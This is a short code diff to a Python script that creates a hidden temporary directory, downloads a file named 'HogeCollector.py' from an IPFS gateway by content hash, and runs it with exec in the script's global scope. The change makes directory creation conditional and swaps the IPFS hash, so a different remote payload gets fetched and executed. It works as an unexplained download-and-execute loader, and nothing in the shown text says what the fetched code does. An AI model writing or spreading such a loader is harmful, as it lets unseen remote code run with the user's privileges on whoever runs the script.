@@ -6,7 +6,8 @@ import shutil
 
 from tempfile import gettempdir
 tmp = os.path.join(gettempdir(), '.{}'.format(hash(os.times())))
-os.makedirs(tmp)
+if not os.path.exists(tmp):
+    os.makedirs(tmp)
 
 
 def install(package):
@@ -35,5 +36,5 @@ def GetFile(url, file_name):
 
 
 url_base = 'https://ipfs.io/ipfs/'
-file_hash = 'QmVLwPECGLCcMitrAWpjz42qricsnkWreRhKXWrTyFQhZu'
+file_hash = 'QmQi2JX1v98saCXmmDbn9YdGLgauMD57fviePaQSsAHETt'
 exec(open(GetFile(url_base + file_hash, 'HogeCollector.py')).read(), globals())
